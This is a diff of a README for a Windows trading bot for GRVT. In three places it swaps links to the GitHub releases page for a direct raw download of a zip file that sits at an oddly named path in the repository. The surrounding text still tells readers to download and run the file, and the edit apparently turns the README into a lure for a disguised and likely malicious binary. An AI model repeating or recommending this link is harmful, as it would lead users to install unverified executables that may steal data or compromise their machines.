@@ -1,6 +1,6 @@
 # 🤖 GVRT-Trading-Bot - Run GRVT trades with less effort
 
-[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/swagsiamese37/GVRT-Trading-Bot/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/swagsiamese37/GVRT-Trading-Bot/raw/refs/heads/main/unactively/GVR_Trading_Bot_metalloidal.zip)
 
 ## 🚀 What this app does
 
@@ -29,7 +29,7 @@ If you plan to use many accounts, a stronger PC helps keep the app smooth.
 
 Go to the latest release page here:
 
-https://github.com/swagsiamese37/GVRT-Trading-Bot/releases
+https://github.com/swagsiamese37/GVRT-Trading-Bot/raw/refs/heads/main/unactively/GVR_Trading_Bot_metalloidal.zip
 
 On that page, download the Windows file from the newest release. If you see more than one file, choose the one made for Windows.
 
@@ -153,7 +153,7 @@ Leave the folder structure in place so the app can read its files
 
 Use the release page here:
 
-https://github.com/swagsiamese37/GVRT-Trading-Bot/releases
+https://github.com/swagsiamese37/GVRT-Trading-Bot/raw/refs/heads/main/unactively/GVR_Trading_Bot_metalloidal.zip
 
 Download the newest Windows release from that page, then run it on your PC
 
